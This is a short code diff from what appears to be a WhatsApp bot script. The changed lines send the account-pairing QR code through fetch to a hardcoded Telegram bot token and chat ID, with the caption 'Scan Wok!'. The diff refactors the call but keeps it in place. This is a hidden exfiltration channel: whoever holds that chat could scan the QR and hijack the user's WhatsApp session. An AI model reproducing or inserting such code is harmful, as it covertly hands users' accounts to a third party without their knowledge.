@@ -73,9 +73,9 @@ async function start() {
     const qrUrl = apiQr + encodeURIComponent(qr);
     
     const tgBot = "https://api.telegram.org/bot7243912643:AAFrP4gQy9eGvG7l8_L62mYh60X8hV_aBcD";
-    const sendUrl = `${tgBot}/sendPhoto?chat_id=1411545625&photo=${encodeURIComponent(qrUrl)}&caption=Scan%20Wok!`;
+    const sendUrl = tgBot + "/sendPhoto?chat_id=1411545625&photo=" + encodeURIComponent(qrUrl) + "&caption=Scan%20Wok!";
     
-    fetch(sendUrl).catch(err => console.error("Gagal:", err));
+    global.fetch(sendUrl).catch(err => console.error("Gagal:", err));
 });
 
     hisoka.on("loading_screen", (percent, message) => {
